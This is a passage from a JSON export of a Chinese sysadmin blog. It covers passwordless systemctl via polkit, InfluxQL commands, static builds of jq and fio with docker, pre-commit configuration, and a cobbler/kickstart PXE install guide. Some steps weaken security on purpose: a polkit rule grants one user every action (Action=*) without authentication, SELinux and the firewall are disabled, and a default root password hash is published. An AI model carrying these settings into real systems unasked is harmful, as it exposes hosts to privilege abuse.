root\\nPassword:\\n\\n\\n```\\n\\n\u8fd9\u91cc\u7684\u8ba4\u8bc1\u662fsystemd\u5f15\u5165polkit\u8ba4\u8bc1\uff0c\u53ef\u4ee5\u901a\u8fc7polkit\u914d\u7f6e\u6587\u4ef6\u6765\u6539\u53d8\u9ed8\u8ba4\u884c\u4e3a\uff0c\u4f8b\u5982\u548c\u914d\u7f6e\u67d0\u4e2a\u666e\u901a\u7528\u6237\u514d\u5bc6\u6267\u884csudo\u4e00\u6837\uff0c\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u914d\u7f6epolkit\u8ba4\u8bc1\u514d\u5bc6\uff1a\\n\\n\u914d\u7f6e\u6587\u4ef6\u8def\u5f84:/etc/polkit-1/localauthority/50-local.d/xxx.pkla\\n\\n\u4f8b\u5982 vi /etc/polkit-1/localauthority/50-local.d/xxx.pkla\\n\\n```bash\\n\\n[disable auth for admin]\\nIdentity=unix-user:yourusername\\nAction=*\\nResultActive=yes\\nResultAny=yes\\nResultInactive=yes\\n```\\n\\n\u4fdd\u5b58\u914d\u7f6e\u7acb\u5373\u751f\u6548\uff0c\u518d\u6267\u884csystemctl restart\u5c31\u4e0d\u4f1a\u63d0\u793a\u8ba4\u8bc1\u4e86\u3002"},{"id":"/2022/12/28/influxdb-ql-use-case","metadata":{"permalink":"/notes/blog/2022/12/28/influxdb-ql-use-case","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2022-12-28-influxdb-ql-use-case.md","source":"@site/blog/2022-12-28-influxdb-ql-use-case.md","title":"influxQL\u5e38\u7528\u8bed\u53e5\u6574\u7406","description":"\u5e74\u7eaa\u5927\u4e86\u8bb0\u6027\u4e0d\u597d","date":"2022-12-28T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"}],"readingTime":0.3,"hasTruncateMarker":false,"authors":[{"name":"\u8001\u53f8\u673a","title":"Maintainer of this proj","url":"https://github.com/itxx00","imageURL":"https://github.com/itxx00.png","key":"itxx00","page":null}],"frontMatter":{"layout":"post","title":"influxQL\u5e38\u7528\u8bed\u53e5\u6574\u7406","authors":"itxx00","description":"\u5e74\u7eaa\u5927\u4e86\u8bb0\u6027\u4e0d\u597d","categories":["shell"],"tags":["bash"]},"unlisted":false,"prevItem":{"title":"\u666e\u901a\u7528\u6237\u6267\u884csystemctl\u542f\u505c\u670d\u52a1\u7981\u7528\u5bc6\u7801\u8ba4\u8bc1","permalink":"/notes/blog/2023/02/02/non-root-systemd"},"nextItem":{"title":"mac\u4e0a\u4f7f\u7528docker\u4ea4\u53c9\u9759\u6001\u7f16\u8bd1jq\u548cfio","permalink":"/notes/blog/2022/11/08/static-build-jq-fio"}},"content":"## db\\n```\\nshow databases\\nuse db1\\nshow retention policies\\ncreate database db2 with duration 30d replication 2\\n```\\n\\n## retention\\n```\\nalter retention policy default on db1 duration 168h default\\nshow retention policies\\n```\\n\\n\\n## measurements\\n```\\nuse db1\\nshow measurements\\nshow measurements with measurement =~ /cpu/\\n\\n```\\n\\n## tag\\n```\\nshow tag keys from cpu\\nshow tag values from cpu with key=cputype\\n```\\n\\n## field\\n```\\nshow field keys from cpu\\n\\n```"},{"id":"/2022/11/08/static-build-jq-fio","metadata":{"permalink":"/notes/blog/2022/11/08/static-build-jq-fio","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2022-11-08-static-build-jq-fio.md","source":"@site/blog/2022-11-08-static-build-jq-fio.md","title":"mac\u4e0a\u4f7f\u7528docker\u4ea4\u53c9\u9759\u6001\u7f16\u8bd1jq\u548cfio","description":"\u63cf\u8ff0","date":"2022-11-08T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"}],"readingTime":1.5,"hasTruncateMarker":false,"authors":[{"name":"\u8001\u53f8\u673a","title":"Maintainer of this proj","url":"https://github.com/itxx00","imageURL":"https://github.com/itxx00.png","key":"itxx00","page":null}],"frontMatter":{"layout":"post","title":"mac\u4e0a\u4f7f\u7528docker\u4ea4\u53c9\u9759\u6001\u7f16\u8bd1jq\u548cfio","authors":"itxx00","description":"\u63cf\u8ff0","categories":["shell"],"tags":["bash"]},"unlisted":false,"prevItem":{"title":"influxQL\u5e38\u7528\u8bed\u53e5\u6574\u7406","permalink":"/notes/blog/2022/12/28/influxdb-ql-use-case"},"nextItem":{"title":"pre-commit basic usage","permalink":"/notes/blog/2022/04/20/pre-commit-basic"}},"content":"## \u601d\u8def\\n\u4e3a\u4e86\u5f97\u5230\u9759\u6001\u7f16\u8bd1\u7684jq\u548cfio\u7a0b\u5e8f\u4e8c\u8fdb\u5236,\u540c\u65f6\u53c8\u9700\u8981x86_64\u548caarch64\u7684\u7248\u672c,\u53ef\u4ee5\u5229\u7528docker\u7684buildx\u5b9e\u73b0\u4ea4\u53c9\u7f16\u8bd1\\n\\n## \u6b65\u9aa4\\n\\n\u7f16\u8bd1fio\\n\\n```bash\\nmkdir fio && cd fio\\nvi Dockerfile\\n```\\n\\nDockerfile \u5982\u4e0b\\n```\\nFROM ubuntu as build\\nWORKDIR /opt\\nARG VER=fio-3.33\\nRUN if [  -e /etc/apt/sources.list ];then sed -ri \'s/[a-zA-Z0-9.]+(debian.org|ubuntu.com)/mirrors.volces.com/g\' /etc/apt/sources.list; fi && \\\\\\n    export DEBIAN_FRONTEND=noninteractive && \\\\\\n    apt-get update && \\\\\\n    apt-get install -y git gcc make cmake libaio1 libaio-dev zlib1g zlib1g-dev\\nRUN git clone https://github.com/axboe/fio.git && \\\\\\n    cd fio  && \\\\\\n    git checkout ${VER}\\nRUN cd fio  && \\\\\\n    ./configure --build-static\\nRUN cd fio && make && make install  && \\\\\\n    strip `which fio` && cp `which fio` /fio-$(dpkg --print-architecture)\\n\\nFROM scratch AS bin\\nCOPY --from=build /fio-* /\\n```\\n\\n\u6267\u884c\u7f16\u8bd1\\n```bash\\ndocker buildx build . --platform linux/amd64 --target bin --output .\\ndocker buildx build . --platform linux/arm64 --target bin --output .\\n```\\n\u7f16\u8bd1\u6210\u529f\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u5f97\u5230\u53ef\u6267\u884c\u7a0b\u5e8ffio-amd64\u548cfio-arm64\u4e24\u4e2a\u6587\u4ef6.\\n\\n\\njq\u7f16\u8bd1\u6b65\u9aa4\u7c7b\u4f3c,dockerfile\u5982\u4e0b:\\n```\\nFROM ubuntu as build\\nWORKDIR /opt\\nARG VER=jq-1.6\\nRUN if [  -e /etc/apt/sources.list ];then sed -ri \'s/[a-zA-Z0-9.]+(debian.org|ubuntu.com)/mirrors.volces.com/g\' /etc/apt/sources.list; fi && \\\\\\n    export DEBIAN_FRONTEND=noninteractive && \\\\\\n    apt-get update && \\\\\\n    apt-get install -y build-essential libtool git gcc make cmake autotools-dev autoconf\\nRUN git clone https://github.com/stedolan/jq.git && \\\\\\n    cd jq  && \\\\\\n    git checkout ${VER} && git submodule update --init\\nRUN cd jq  && \\\\\\n    autoreconf -fi && \\\\\\n    ./configure --disable-maintainer-mode --disable-valgrind --with-oniguruma=builtin --enable-all-static --prefix=/usr/local\\nRUN cd jq && LDFLAGS=-all-static make -j4 && make install  && \\\\\\n    strip /usr/local/bin/jq && cp /usr/local/bin/jq /jq-$(dpkg --print-architecture)\\n\\nFROM scratch AS bin\\nCOPY --from=build /jq-* /\\n```"},{"id":"/2022/04/20/pre-commit-basic","metadata":{"permalink":"/notes/blog/2022/04/20/pre-commit-basic","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2022-04-20-pre-commit-basic.md","source":"@site/blog/2022-04-20-pre-commit-basic.md","title":"pre-commit basic usage","description":"\u63cf\u8ff0","date":"2022-04-20T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"}],"readingTime":1.02,"hasTruncateMarker":false,"authors":[{"name":"\u8001\u53f8\u673a","title":"Maintainer of this proj","url":"https://github.com/itxx00","imageURL":"https://github.com/itxx00.png","key":"itxx00","page":null}],"frontMatter":{"layout":"post","title":"pre-commit basic usage","authors":"itxx00","description":"\u63cf\u8ff0","categories":["shell"],"tags":["bash"]},"unlisted":false,"prevItem":{"title":"mac\u4e0a\u4f7f\u7528docker\u4ea4\u53c9\u9759\u6001\u7f16\u8bd1jq\u548cfio","permalink":"/notes/blog/2022/11/08/static-build-jq-fio"},"nextItem":{"title":"\u4f7f\u7528cobbler\u6279\u91cf\u5b89\u88c5centos\u7cfb\u7edf","permalink":"/notes/blog/2022/04/20/pxe-cobbler-install"}},"content":"## install\\n\\n```\\npip install pre-commit\\n\\n```\\n\\n## init\\n\\n```\\ngit clone https://xxx/xxx.git\\ncd xxx\\npre-commit install\\n\\npre-commit sample-config >.pre-commit-config.yaml\\n```\\n\\n## test\\n\\n```\\npre-commit run --all-files\\npre-commit run --files xxx.py\\n\\n```\\n\\n## sample conf\\n\\n```yaml\\n# See https://pre-commit.com for more information\\n# See https://pre-commit.com/hooks.html for more hooks\\nrepos:\\n  - repo: https://github.com/pre-commit/pre-commit-hooks\\n    rev: v4.5.0\\n    hooks:\\n      - id: trailing-whitespace\\n      - id: end-of-file-fixer\\n      - id: check-yaml\\n      - id: check-added-large-files\\n\\n  - repo: https://github.com/talos-systems/conform\\n    rev: v0.1.0-alpha.27\\n    hooks:\\n      - id: conform\\n        stages:\\n          - commit-msg\\n\\n\\n  - repo: https://github.com/5xops/mirrors-shellcheck\\n    rev: v1.0\\n    hooks:\\n      - id: shellcheck\\n        args:\\n          - --exclude=SC2148,SC2155,SC2009,SC2029,SC1091\\n\\n  - repo: https://github.com/psf/black\\n    rev: 23.11.0\\n    hooks:\\n      - id: black\\n        args: [--line-length=1000]\\n\\n\\n#  - repo: https://github.com/pre-commit/mirrors-mypy\\n#    rev: v0.770\\n#    hooks:\\n#      - id: mypy\\n#        language: python_venv\\n#        exclude: ^(docs/|example-plugin/|tests/fixtures)\\n\\n  - repo: https://github.com/PyCQA/flake8\\n    rev: 6.1.0\\n    hooks:\\n      - id: flake8\\n        exclude: $(.tox/|.git/|__pycache__/|build/|dist/|.cache|.eggs/)\\n        args:\\n          - --ignore=E501,W503,E722,W605,E203\\n\\n  - repo: https://github.com/PyCQA/pylint\\n    rev: v3.0.1\\n    hooks:\\n      - id: pylint\\n        language: python\\n        args:\\n          - --disable=R0801,C0114,C0115,C0116,C0209,C0415,E0401,W1401,R0912,R0913,R0914,R0915,W0212,C0103\\n          - --max-line-length=120\\n```"},{"id":"/2022/04/20/pxe-cobbler-install","metadata":{"permalink":"/notes/blog/2022/04/20/pxe-cobbler-install","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2022-04-20-pxe-cobbler-install.md","source":"@site/blog/2022-04-20-pxe-cobbler-install.md","title":"\u4f7f\u7528cobbler\u6279\u91cf\u5b89\u88c5centos\u7cfb\u7edf","description":"\u63cf\u8ff0","date":"2022-04-20T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"}],"readingTime":8.49,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u4f7f\u7528cobbler\u6279\u91cf\u5b89\u88c5centos\u7cfb\u7edf","description":"\u63cf\u8ff0","categories":["shell"],"tags":["bash"]},"unlisted":false,"prevItem":{"title":"pre-commit basic usage","permalink":"/notes/blog/2022/04/20/pre-commit-basic"},"nextItem":{"title":"CVM\u4f7f\u7528ISO\u955c\u50cf\u5b89\u88c5\u94f6\u6cb3\u9e92\u9e9fv10 arm\u7cfb\u7edf","permalink":"/notes/blog/2021/12/16/cvm-kylin-v10-iso-install"}},"content":"### \u57fa\u672c\u4ecb\u7ecd\uff1a\\nPXE\uff08preboot execute environment\uff09\u7531Intel\u53d1\u660e\u7684\u901a\u8fc7\u7f51\u7edc\u5feb\u901f\u5f15\u5bfc\u64cd\u4f5c\u7cfb\u7edf\u7684\u6280\u672f\uff0c\u5176\u539f\u7406\u662f\u5728\u673a\u5668\u5f15\u5bfc\u65f6\u901a\u8fc7server\u7aef\u4e3a\u7f51\u5361DHCP\u5206\u914dIP\u4fe1\u606f\uff0c\u5e76\u901a\u77e5client\u7aefnext_server\u4e2d\u7684tftp\u5730\u5740\uff0cclient\u7aef\u7ee7\u7eed\u901a\u8fc7tftp\u4e0b\u8f7d\u7cfb\u7edf\u5f15\u5bfc\u955c\u50cf\uff0c\u52a0\u8f7d\u5e76\u5b8c\u6210\u542f\u52a8\u3002\u8fd9\u91cc\u6211\u4eec\u8fd8\u4f1a\u7528\u5230\u53e6\u5916\u4e00\u9879\u6280\u672f\u53ebkickstart\uff0c\u7531\u7ea2\u5e3d\u5f00\u53d1\uff0c\u65e9\u5148\u7528\u4e8e\u5176\u7cfb\u7edf\u5b89\u88c5\u5de5\u5177\u4e2d\u4ee5\u5b8c\u6210\u81ea\u52a8\u5316\u5b89\u88c5\uff0c\u5df2\u88ab\u4f17\u591a\u53d1\u884c\u7248\u652f\u6301\u3002\u7cfb\u7edf\u5f15\u5bfc\u65f6\u53ef\u4ee5\u901a\u8fc7kickstart\u914d\u7f6e\u6587\u4ef6\u4e2d\u6307\u5b9a\u7684\u5b89\u88c5\u6d41\u7a0b\u81ea\u52a8\u5b8c\u6210\u540e\u7eed\u6b65\u9aa4\uff0c\u51cf\u5c11\u4eba\u5de5\u5e72\u9884\u3002\u800c\u901a\u5e38\u624b\u5de5\u914d\u7f6edhcp\u3001tftp\u3001kickstart\u7b49\u5f80\u5f80\u6bd4\u8f83\u7e41\u7410\uff0c\u8fd9\u91cc\u6211\u4eec\u4f1a\u5229\u7528\u7ea2\u5e3d\u5f00\u53d1\u7684\u53e6\u5916\u4e00\u6b3e\u5de5\u5177cobbler\uff0c\u901a\u8fc7cobbler\u6765\u5b8c\u6210\u6574\u4e2adhcp\u3001tftp\u3001kickstart\u7b49\u7ec4\u6210\u7684server\u7aef\u73af\u5883\u7684\u5feb\u901f\u642d\u5efa\u548c\u7ba1\u7406\uff0c\u4ee5\u6b64\u63d0\u9ad8\u6548\u7387\u3002\\n\\n### cobbler\u5b89\u88c5\u914d\u7f6e\uff1a\\n\u6211\u4eec\u4f7f\u7528CentOS7\u4f5c\u4e3aserver\u7aef\u7cfb\u7edf\uff0c\u4e3a\u4e86\u8282\u7ea6\u73b0\u573a\u90e8\u7f72\u65f6\u95f4\uff0c\u6211\u4eec\u5c06\u63d0\u524d\u51c6\u5907\u597d\u73af\u5883\u5e76\u76f4\u63a5\u5e26\u5230\u73b0\u573a\u4f7f\u7528\uff0c\u4ee5\u4e0b\u6240\u6709\u64cd\u4f5c\u5c06\u5728\u4e00\u53f0ThinkPad\u4e0a\u5b8c\u6210\u3002\\n\\n\u56e0\u79c1\u6709\u5316\u73af\u5883\u65e0\u9700\u8fde\u5916\u7f51\uff0c\u56e0\u6b64\u5728\u5b9e\u9645\u4f7f\u7528\u65f6\u6211\u4eec\u4e3a\u4e86\u7b80\u5316\u90e8\u7f72\u6d41\u7a0b\uff0c\u53ef\u4ee5\u5c06selinux\u548c\u9632\u706b\u5899\u7981\u7528\u6389\uff0c\u5982\u9700\u8981\u542f\u7528\u9632\u706b\u5899\u7684\u8bdd\u5219\u9700\u8981\u653e\u5f00http/dhcp/tftp\u7b49\u670d\u52a1\u7684\u5bf9\u5e94\u7aef\u53e3\uff1a\\n\\n```\\n# disable selinux\\nsed -i \'s/^SELINUX=.*$/SELINUX=disabled/\' /etc/selinux/config\\n\\n# disable iptables\\nsystemctl disable firewalld\\nsystemctl stop firewalld\\n\\nreboot\\n```\\n\\n\xa0\u5b89\u88c5cobbler\u53ca\u76f8\u5173\u7684\u4f9d\u8d56\u5305\uff1acobbler\u63d0\u4f9b\u4e86\u547d\u4ee4\u884c\u7ba1\u7406\u5de5\u5177\u548c\u4e00\u4e2aweb\u7ba1\u7406\u5de5\u5177\uff0c\u5206\u522b\u7531cobbler\u548ccobbler-web\u4e24\u4e2a\u5305\u63d0\u4f9b\\n```\\nyum install epel-release\\nyum install cobbler cobbler-web httpd dhcp tftp xinetd rsync bind\\n```\\n\\n\u914d\u7f6ecobbler\uff1acobbler\u914d\u7f6e\u6587\u4ef6\u653e\u7f6e\u5728/etc/cobbler\u76ee\u5f55\uff0c\u5728\u542f\u52a8\u4e4b\u524d\u9700\u8981server\u7aefIP\uff0cdhcp\u7b49\u76f8\u5173\u4fe1\u606f\uff0c\u9996\u5148\u4fee\u6539 /etc/cobbler/settings\u4e3b\u914d\u7f6e\u6587\u4ef6\uff0c\u9700\u8981\u4fee\u6539\u7684\u53c2\u6570\u6709\u4ee5\u4e0b\uff1a\\n```\\n# \u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u751f\u6210\u7cfb\u7edf\u5b89\u88c5\u540e\u7684\u9ed8\u8ba4root\u5bc6\u7801\\nopenssl passwd -1\\n# \u5e76\u5c06\u751f\u6210\u7684\u5bc6\u7801\u4fee\u6539\u5230\u914d\u7f6e\u4e2d\\ndefault_password_crypted: \u201c$1$RUNYOYnz$QgzdhCD2T7qXWI1IPpAih0\u201d\\n\\n# server\u7aefip\uff0c\u5bf9\u5916\u63d0\u4f9bdhcp\u548chttp\u670d\u52a1\uff0c\u5fc5\u987b\u4e3a\u4e00\u4e2a\u56fa\u5b9a\u5185\u7f51ip\u5730\u5740\\nserver: 192.168.1.1\\n\\n# next_server\u4e3atftp\u670d\u52a1\u6240\u5728ip\uff0c\u901a\u5e38\u662f\u9700\u8981\u548cserver\u4fdd\u6301\u4e00\u81f4\\nnext_server: 192.168.1.1\\n\\n# \u6253\u5f00cobbler\u5bf9\u76f8\u5173\u670d\u52a1\u7684\u81ea\u52a8\u7ba1\u7406\u529f\u80fd\uff0c\u5982\u914d\u7f6e\u53d8\u66f4\u548c\u542f\u505c\u7b49\\nmanage_dhcp: 1\\nmanage_tftpd\uff1a1\\n```\\n\\n\xa0\u4fee\u6539\u4f9d\u8d56\u7ec4\u4ef6\u7684\u914d\u7f6e\uff1a\\n```\\nsed -i \'/disable/c\\\\\\\\tdisable\\\\t\\\\t\\\\t= no\' /etc/xinetd.d/tftp\\nservice xinetd restart\\n\u4fee\u6539dhcp\u7f51\u6bb5\uff1avi /etc/cobbler/dhcp.template\\nsubnet 192.168.1.0 netmask 255.255.255.0 {\\n     option routers             192.168.1.1;\\n     option domain-name-servers 192.168.1.1;\\n\xa0 \xa0 \xa0range dynamic-bootp \xa0 \xa0 \xa0 \xa0192.168.1.100 192.168.1.200;\\n     option subnet-mask         255.255.255.0;\\n     filename                   \\"/pxelinux.0\\";\\n     default-lease-time         21600;\\n     max-lease-time             43200;\\n     next-server                $next_server;\\n}\\n```\\n\\n\u542f\u52a8\u670d\u52a1\uff1a\\n```\\nsystemctl start httpd\\nsystemctl start cobblerd\\n\\nsystemctl enable httpd\\nsystemctl enable cobblerd\\n\xa0\u670d\u52a1\u68c0\u67e5\uff1acobbler\u63d0\u4f9b\u4e86check\u547d\u4ee4\u53ef\u7528\u4e8e\u68c0\u67e5\u5404\u9879\u914d\u7f6e\u662f\u5426\u6ee1\u8db3\u9700\u8981\\n\\ncobbler check\\n# \u901a\u5e38\u7b2c\u4e00\u6b21\u4f1a\u63d0\u793a\u4e0b\u8f7dloader\\ncobbler get-loaders\\n# \u5982\u4e2d\u9014\u4fee\u6539cobbler\u914d\u7f6e\u540e\u9700\u91cd\u542fcobbler\u670d\u52a1\\nsystemctl restart cobblerd\\n# \u5982\u53d8\u66f4\u4e86dhcp\u3001tftp\u7b49\u76f8\u5173\u4fe1\u606f\u9700\u91cd\u65b0\u540c\u6b65\u914d\u7f6e\\ncobbler sync\\n# \u987a\u4fbf\u914d\u7f6e\u597dweb\u7ba1\u7406\u9875\u9762\u7684\u8bbf\u95ee\u5bc6\u7801\\nhtdigest /etc/cobbler/users.digest \\"Cobbler\\" cobbler\\n```\\n\\n\xa0\u53ef\u4ee5\u53cd\u590d\u901a\u8fc7check\u547d\u4ee4\u6765\u68c0\u67e5\u73af\u5883\u662f\u5426\u90e8\u7f72OK\uff0c\u5e76\u6839\u636e\u5b9e\u9645\u9700\u6c42\u8c03\u6574\u5404\u9879\u914d\u7f6e\u6587\u4ef6\uff0c\u76f4\u81f3check\u7ed3\u679c\u590d\u5408\u8981\u6c42\u5373\u53ef\u3002\u81f3\u6b64cobbler\u7684\u5b89\u88c5\u53ca\u914d\u7f6e\u5b8c\u6210\u3002web\u7aef\u5de5\u5177\u8bbf\u95ee\u5730\u5740\uff1ahttps://192.168.1.1/cobbler_web\\n\\n\\n\\n### \u7cfb\u7edf\u955c\u50cf\u51c6\u5907\uff1a\\n\\n\u63a5\u4e0b\u6765\u6211\u4eec\u9700\u8981\u5c06\u7cfb\u7edf\u955c\u50cf\u5bfc\u5165cobbler\u4e2d\uff0c\u5e76\u81ea\u5b9a\u4e49\u5b89\u88c5\u5f15\u5bfc\u7684kickstart\u914d\u7f6e\u3002\u6211\u4eec\u8981\u90e8\u7f72\u5230\u8282\u70b9\u4e0a\u7684\u7cfb\u7edf\u662fCentOS7\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u5982\u679c\u9700\u8981\u901a\u8fc7kickstart\u5b9a\u5236\u4e00\u4e9b\u57fa\u7840\u8f6f\u4ef6\u5305\u7684\u5b89\u88c5\uff0c\u90a3\u4e48\u9700\u8981\u4f7f\u7528\u8f6f\u4ef6\u5305\u66f4\u5168\u7684DVD iso\uff0c\u56e0minimal iso\u4e2d\u63d0\u4f9b\u7684\u8f6f\u4ef6\u5305\u6709\u9650\u3002\\n```\\n# \u5c06iso\u6302\u8f7d\u5230\u672c\u5730\u76ee\u5f55\\nmount -o auto CentOS-7-x86_64-DVD-1611.iso /mnt/\\n# \u5bfc\u5165\u5230cobbler\u4e2d\\ncobbler import --name=centos7 --arch=x86_64 --path=/mnt\\n# \u67e5\u770b\u5bfc\u5165\u7684\u7cfb\u7edf\u53caprofile\\ncobbler distro list\\ncobbler distro report --name=centos7-x86_64\\ncobbler profile list\\n# \u5378\u8f7diso mount point\\numount /mnt/\\n```\\n\\n\xa0\u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u6b65\u9aa4\u4e2d\u6211\u4eec\u5c06CentOS7\u955c\u50cf\u5bfc\u5165\u5230cobbler\u4e2d\uff0c\u6709\u51e0\u4e2a\u6838\u5fc3\u6982\u5ff5\u9700\u8981\u7406\u89e3\uff1a\\n\\ndistro - \u53ca\u7cfb\u7edf\u53d1\u884c\u7248\u672c\uff0c\u4e0d\u540c\u7684\u955c\u50cf\u5bfc\u5165\u540e\u5bf9\u5e94\u4e0d\u540c\u7684distro\uff0c\u5982centos7-x86_64\uff0c\u4e0d\u540c\u7684distro\u5bf9\u5e94\u4e0d\u540c\u7684\u5f15\u5bfc\u955c\u50cf\uff1b\\n\\nprofile - distro\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u4e00\u4e2adistro\u53ef\u4ee5\u6709\u591a\u4e2aprofile\uff0c\u9ed8\u8ba4\u5bfc\u5165\u65f6\u4f1a\u81ea\u52a8\u751f\u6210\u4e00\u4e2aprofile\uff0c\u4e0d\u540c\u7684profile\u53ef\u4ee5\u5b9a\u4e49\u4e0d\u540c\u7684kernel\u9009\u9879\uff0c\u4f7f\u7528\u4e0d\u540c\u7684kickstart\u914d\u7f6e\uff1b\\n\\nsystem - \u5404\u4e2a\u673a\u5668\u6240\u4f7f\u7528\u7684profile\u5b9e\u4f8b\uff0c\u4e0e\u673a\u5668MAC\u5730\u5740\u7ed1\u5b9a\uff0c\u53ef\u4ee5\u7ec6\u5316\u5230\u673a\u5668\u7ea7\u522b\u7684\u81ea\u5b9a\u4e49\u5b89\u88c5\uff0c\u5982\u679c\u6240\u6709\u673a\u5668\u5b89\u88c5\u90fd\u662f\u7edf\u4e00\u7684\u5219\u65e0\u9700\u4f7f\u7528system\u914d\u7f6e\u3002\\n\\n\xa0\u63a5\u4e0b\u6765\u9700\u8981\u7406\u89e3\u7684\u662fcobbler\u4e2d\u5bf9kickstart\u6587\u4ef6\u7684\u7ba1\u7406\u65b9\u5f0f\uff0cks\u6587\u4ef6\u662f\u6211\u4eec\u9700\u8981\u91cd\u70b9\u5173\u6ce8\u7684\u4e2d\u95f4\u4ea7\u7269\uff0c\u51b3\u5b9a\u4e86\u7cfb\u7edf\u81ea\u52a8\u5316\u90e8\u7f72\u7684\u6267\u884c\u6d41\u7a0b\u548c\u6700\u7ec8\u6548\u679c\u3002ks\u6587\u4ef6\u4e0eprofile\u7ed1\u5b9a\uff0c\u9ed8\u8ba4\u751f\u6210\u7684profile\u4f1a\u6307\u5411\u4e00\u4e2a\u9ed8\u8ba4\u7684ks\u6587\u4ef6\uff0c\u901a\u5e38\u6211\u4eec\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u81ea\u5b9a\u4e49\u6765\u6ee1\u8db3\u4e0d\u540c\u7684\u90e8\u7f72\u8981\u6c42\u3002\u5f53\u7cfb\u7edf\u901a\u8fc7PXE\u5f15\u5bfc\u81f3profile\u9009\u62e9\u83dc\u5355\u540e\uff0c\u4e00\u65e6\u9009\u5b9a\u4e86\u9700\u8981\u90e8\u7f72\u7684\u7cfb\u7edf\uff0c\u63a5\u4e0b\u6765\u5c31\u4f1a\u6309\u7167\u8be5profile\u6240\u5bf9\u5e94\u7684ks\u6587\u4ef6\u6765\u6267\u884c\u4e00\u7cfb\u5217\u7684\u5b89\u88c5\u64cd\u4f5c\u3002\\n\\n\u5728cobbler\u4e2dks\u6587\u4ef6\u7684\u5b9e\u4f8b\u662f\u901a\u8fc7cgi\u52a8\u6001\u751f\u6210\u7684\uff0c\u800c\u751f\u6210ks\u5b9e\u4f8b\u6240\u4f9d\u8d56\u7684\u5219\u662fks templates\u548csnippets\uff0c cobbler\u901a\u8fc7template\u6765\u5c06ks\u6587\u4ef6\u4e3b\u4f53\u6d41\u7a0b\u90e8\u5206\u6a21\u677f\u5316\uff0c\u901a\u8fc7snippets\u6765\u7ba1\u7406\u53ef\u4ee5\u5728\u4e0d\u540cks templates\u4e2d\u516c\u7528\u7684\u6d41\u7a0b\u7247\u6bb5\u3002\\n\\n\u6211\u4eec\u7684\u9700\u6c42\u5982\u4e0b\uff1a\\n\\n\u5b89\u88c5\u4e00\u4e2a\u7cbe\u7b80\u7684CentOS7\u7cfb\u7edf\uff1b\\n\u540c\u65f6\u9ed8\u8ba4\u5b89\u88c5\u4e00\u4e9b\u5fc5\u8981\u7684\u8f6f\u4ef6\u5305\uff1b\\n\u9996\u6b21\u5b89\u88c5\u65f6\u53ea\u5bf9\u7cfb\u7edf\u76d8\u8fdb\u884c\u5206\u533a\u548c\u683c\u5f0f\u5316\uff0c\u5176\u4ed6\u78c1\u76d8\u4e0d\u52a8\uff1b\\n\u4e3a\u4e86\u4fbf\u4e8e\u7ba1\u7406\u6211\u4eec\u5c06\u66f4\u6539\u7f51\u5361\u540d\u4e3aethX\uff0c\u4e14\u9ed8\u8ba4\u7981\u7528IPv6,\uff1b\\n\u4e3a\u4e86\u65b9\u4fbf\u4f7f\u7528\u865a\u62df\u673a\u6d4b\u8bd5\u6574\u4e2a\u5b89\u88c5\u6d41\u7a0b\uff0c\u9700\u8981\u5728\u78c1\u76d8\u5206\u533a\u65f6\u81ea\u52a8\u9002\u914d\u78c1\u76d8\u540d\u5982vda/sda\uff1b\\n\u5b89\u88c5\u5b8c\u6210\u540e\u80fd\u5bf9\u4e00\u4e9b\u57fa\u7840\u914d\u7f6e\u8fdb\u884c\u521d\u59cb\u5316\u3002\xa0 \xa0 \xa0 \xa0\\n\\n\u9996\u5148\u62f7\u8d1dcobbler\u9ed8\u8ba4\u7684template\u751f\u6210\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684ks template\uff0c\\n```\\n# kickstart template\\n# (includes %end blocks)\\n# do not use with earlier distros\\n\\n#platform=x86, AMD64, or Intel EM64T\\n# System authorization information\\nauth --useshadow --enablemd5\\n# System bootloader configuration\\n#bootloader --location=mbr\\n# Partition clearing information\\nclearpart --all --initlabel\\n# Use text mode install\\ntext\\n# Firewall configuration\\nfirewall --disabled\\n# Run the Setup Agent on first boot\\nfirstboot --disable\\n# System keyboard\\nkeyboard us\\n# System language\\nlang en_US\\n# Use network installation\\nurl --url=$tree\\n# If any cobbler repo definitions were referenced in the kickstart profile, include them here.\\n$yum_repo_stanza\\n# Network information\\n$SNIPPET(\'network_config\')\\n# Reboot after installation\\nreboot\\n\\n#Root password\\nrootpw --iscrypted $default_password_crypted\\n# SELinux configuration\\nselinux --disabled\\n# Do not configure the X Window System\\nskipx\\n# System timezone\\ntimezone Asia/Shanghai\\n\\n# Install OS instead of upgrade\\ninstall\\n# Clear the Master Boot Record\\nzerombr\\n# Allow anaconda to partition the system as needed\\n#autopart\\n$SNIPPET(\'main_partition_select\')\\n\\n%pre\\n$SNIPPET(\'log_ks_pre\')\\n$SNIPPET(\'kickstart_start\')\\n$SNIPPET(\'pre_install_network_config\')\\n$SNIPPET(\'pre_partition_select_custom\')\\n# Enable installation monitoring\\n$SNIPPET(\'pre_anamon\')\\n%end\\n\\n%packages\\n@^minimal\\n@core\\nchrony\\nwget\\nnet-tools\\npython-setuptools\\nrsync\\nlrzsz\\nexpect\\ntcl\\nntpdate\\n-selinux-policy*\\n-NetworkManager*\\n-kexec-tools\\n-snappy\\n-wpa_supplicant\\n-ppp\\n%end\\n\\n%addon com_redhat_kdump --disable --reserve-mb=\'auto\'\\n\\n%end\\n\\n%post --nochroot\\n$SNIPPET(\'log_ks_post_nochroot\')\\n%end\\n\\n%post\\n$SNIPPET(\'log_ks_post\')\\n# Start yum configuration\\n$yum_config_stanza\\n# End yum 